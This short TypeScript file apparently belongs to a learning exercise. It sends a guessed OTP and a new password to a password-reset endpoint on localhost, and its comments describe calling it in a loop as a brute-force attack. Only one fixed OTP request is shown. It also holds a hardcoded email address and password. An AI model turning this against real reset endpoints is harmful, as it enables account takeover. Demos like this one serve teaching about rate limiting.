//since ts is used, use import instead of require

import axios from "axios";

//sending request in a loop --> bruteforce attack
//now call this sendRequest function inside a for loop

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "jordancenataker@gmail.com",
    otp: otp,
    newPassword: "anish@34w4",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios.request(config);
}

sendRequest("290801");
